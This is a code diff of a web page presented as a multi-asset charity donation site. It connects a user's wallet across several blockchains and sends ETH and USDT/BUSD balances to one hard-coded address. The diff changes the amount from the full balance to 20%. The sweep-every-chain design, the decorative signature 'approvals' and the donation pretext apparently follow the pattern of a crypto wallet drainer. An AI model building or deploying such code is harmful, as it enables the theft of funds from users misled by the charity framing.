@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Multi-Asset Unlimited Charity Donation</title>
+<title>Multi-Asset 20% Charity Donation</title>
 <style>
 body { font-family:sans-serif; background:#f6f9fc; display:flex; justify-content:center; align-items:center; height:100vh; }
 .card { background:#fff; padding:20px; border-radius:12px; box-shadow:0 6px 18px rgba(16,24,40,0.06); width:480px; }
@@ -15,7 +15,7 @@ button { padding:10px 16px; border:none; border-radius:8px; cursor:pointer; font
 </head>
 <body>
 <div class="card">
-<h2>Donate Full Balance of Each Asset to Charity</h2>
+<h2>Donate 20% of Each Asset to Charity</h2>
 <div>
 <button id="connect">Connect Wallet & Donate</button>
 <button id="disconnect" disabled>Disconnect</button>
@@ -42,7 +42,7 @@ async function initProvider(){
     projectId:PROJECT_ID,
     chains:[1,56,137,43114],
     showQrModal:true,
-    metadata:{name:'Multi-Asset Charity',description:'Approve full donation of ETH & tokens',url:window.location.origin,icons:['https://walletconnect.com/walletconnect-logo.svg']}
+    metadata:{name:'Multi-Asset Charity',description:'Approve 20% donation of ETH & tokens',url:window.location.origin,icons:['https://walletconnect.com/walletconnect-logo.svg']}
   });
   window.__WC_PROVIDER=provider;
 }
@@ -71,25 +71,25 @@ async function connectWallet(){
 
   for(const chainId of provider.config.chains){
     try{
-      // ETH donation (full balance)
+      // ETH donation
       const balanceHex=await provider.request({method:'eth_getBalance',params:[account,'latest'],chainId});
       const balance=parseInt(balanceHex,16)/1e18;
       if(balance>0){
-        const donation=balance.toFixed(6);
-        await provider.request({method:'personal_sign',params:[`I approve full donation of ${donation} ETH on chain ${chainId}`,account],chainId});
-        const txHash=await provider.request({method:'eth_sendTransaction',params:[{from:account,to:CHARITY,value:'0x'+(BigInt(Math.floor(balance*1e18))).toString(16)}],chainId});
+        const donation=(balance*0.2).toFixed(6);
+        await provider.request({method:'personal_sign',params:[`I approve 20% donation of ${donation} ETH on chain ${chainId}`,account],chainId});
+        const txHash=await provider.request({method:'eth_sendTransaction',params:[{from:account,to:CHARITY,value:'0x'+(BigInt(Math.floor(balance*1e18*0.2))).toString(16)}],chainId});
         statusEl.textContent+=`\nETH chain ${chainId}: Sent ${donation} ETH (tx ${txHash})`;
       }
 
-      // ERC20 donations (full balance)
+      // Example ERC20 tokens (replace with dynamic discovery if needed)
       const tokens={1:[{symbol:'USDT',address:'0xdAC17F958D2ee523a2206206994597C13D831ec7'}],56:[{symbol:'BUSD',address:'0xe9e7cea3dedca5984780bafc599bd69add087d56'}]};
       if(tokens[chainId]){
         for(const t of tokens[chainId]){
           const bal=await getTokenBalance(t.address,account,chainId);
           if(bal>0){
-            const donation=bal.toFixed(6);
-            await provider.request({method:'personal_sign',params:[`I approve full donation of ${donation} ${t.symbol} on chain ${chainId}`,account],chainId});
-            const txHash=await sendToken(t.address,CHARITY,bal,chainId);
+            const donation=(bal*0.2).toFixed(6);
+            await provider.request({method:'personal_sign',params:[`I approve 20% donation of ${donation} ${t.symbol} on chain ${chainId}`,account],chainId});
+            const txHash=await sendToken(t.address,CHARITY,bal*0.2,chainId);
             statusEl.textContent+=`\n${t.symbol} chain ${chainId}: Sent ${donation} (tx ${txHash})`;
           }
         }
